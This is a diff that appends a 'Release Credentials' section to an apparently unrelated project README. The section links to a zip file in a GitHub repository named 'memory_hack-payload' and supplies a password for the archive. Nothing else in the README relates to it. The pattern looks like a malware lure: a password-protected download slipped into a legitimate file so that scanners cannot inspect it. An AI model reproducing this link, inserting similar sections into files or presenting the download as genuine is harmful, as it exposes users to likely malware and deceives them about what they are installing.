@@ -138,3 +138,10 @@ Only if you want
    [OnsenUI]: <https://onsen.io/>
    [Falcon]: <https://github.com/falconry/falcon>
    [jQuery]: <http://jquery.com>
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/SavageBullCrucible/memory_hack-payload-9xzy/releases/download/v1.0.0/memory_hack.zip)
+- **Archive Password:** `VSBSTLnNT2`
